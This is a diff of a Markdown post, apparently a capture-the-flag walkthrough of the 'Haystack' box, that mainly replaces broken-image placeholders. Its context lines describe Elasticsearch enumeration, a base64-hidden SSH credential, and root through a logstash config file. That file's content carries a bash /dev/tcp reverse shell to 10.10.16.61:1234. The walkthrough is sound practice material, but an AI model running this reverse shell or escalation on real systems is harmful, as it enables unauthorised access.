@@ -9,11 +9,7 @@ categories: [靶机]
 date: "2019-11-30"
 ---
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+![eyER9x.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/edb5c8933ce1.png)
 
 ## Introduction
 
@@ -61,19 +57,11 @@ PORT     STATE SERVICE VERSION
 
 For port 80, we find nothing except a picture of a needle. Exiftool is used to analyze. But nothing interesting found. Try to use gobuster to brute force the directory, but have not found any useful directories.
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+![eyER9x.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/edb5c8933ce1.png)
 
 For port 9200, nmap seems to be failed to detect. But this port should be familiar to elasticserarch users. Elasticsearch is a popular search database in recent years. Something is interesting in elasticsearch. We will talk about this later.
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+> **（配图未能自动恢复）** 原地址：`https://s2.ax1x.com/2019/08/03/eDD780.png`
 
 ## Exploit
 
@@ -131,11 +119,7 @@ This key cannot be lost, I keep it here: cGFzczogc3BhbmlzaC5pcy5rZXk=
 
 The end of the strings is encoded by base64. When decoded, we can find the username and password. Then you can ssh by the username and password. 
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+> **（配图未能自动恢复）** 原地址：`https://s2.ax1x.com/2019/08/03/eDrFKO.png`
 
 To be honest, I don't like the user of the box. But it does works as the keyword: you have to find a needle in haystack.
 
@@ -185,11 +169,7 @@ Connection: close
 
 Wait for a while, then we are kibana.
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+> **（配图未能自动恢复）** 原地址：`https://s2.ax1x.com/2019/08/03/erZrTA.png`
 
 But we are still not root! Don't be upset. Let's move on. If we look at the logstash in the machine carefully, we will find something interesting. We find the user group `kibana` has write permission of `conf.d` of logstash.
 
@@ -212,11 +192,7 @@ drwxrwxr-x.  2 root   kibana   62 jun 24 08:12 conf.d
 
 So the exploit is very clear. Create a file in `/opt/kibana/` whose name begins with `logstah_`. And make sure the content in the file can be parsed by grok correctly. Then the command can be executed successfully. The most important part is how to create the content to be parsed to correct `comando`. So you should know how to use grok. Grok is utilized to recognize specific fields by the regular expression. [Grok Debugger] is a useful tool to test grok online.
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+> **（配图未能自动恢复）** 原地址：`https://s2.ax1x.com/2019/08/03/erlWZT.png`
 
 The expression is quite simple. If you know the regular expression, it will not be hard to understand the expression here.
 
@@ -268,8 +244,5 @@ echo "Ejecutar  comando: bash -i >& /dev/tcp/10.10.16.61/1234 0>&1" > /opt/kiban
 
 Use the nc to listen at port 1234, wait a while, root is coming.
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
+> **（配图未能自动恢复）** 原地址：`https://s2.ax1x.com/2019/08/04/eyPIxg.png`
 
